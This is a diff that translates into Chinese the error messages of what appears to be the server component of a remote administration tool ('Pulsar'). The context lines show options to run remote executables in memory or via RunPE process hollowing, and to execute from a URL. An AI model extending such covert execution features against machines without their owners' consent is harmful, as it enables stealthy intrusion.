@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
@@ -69,7 +69,7 @@ namespace Pulsar.Server.Messages
         {
             if (!File.Exists(remotePath))
             {
-                MessageBox.Show($"File not found: {remotePath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show($"找不到文件：{remotePath}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
 
@@ -83,18 +83,18 @@ namespace Pulsar.Server.Messages
                 const uint ERROR_SHARING_VIOLATION = 32;
                 if (((uint)ex.HResult & 0xFFFFu) == ERROR_SHARING_VIOLATION)
                 {
-                    MessageBox.Show($"The file '{remotePath}' is in use by another process.", "File in use", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    MessageBox.Show($"文件 '{remotePath}' 正被其他进程占用。", "文件被占用", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return;
                 }
 
-                MessageBox.Show($"Unable to read file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show($"无法读取文件：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
             string ext = Path.GetExtension(remotePath);
 
             if ((executeInMemory || useRunPE) && !string.Equals(ext, ".exe", StringComparison.OrdinalIgnoreCase))
             {
-                MessageBox.Show("Only .exe files are allowed for RunPE or reflection execution.", "Invalid File Type",
+                MessageBox.Show("RunPE 或反射执行仅允许 .exe 文件。", "无效的文件类型",
                     MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
@@ -116,7 +116,7 @@ namespace Pulsar.Server.Messages
         {
             if (string.IsNullOrWhiteSpace(url))
             {
-                MessageBox.Show("URL cannot be empty.", "Invalid URL", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("URL 不能为空。", "无效的 URL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
 
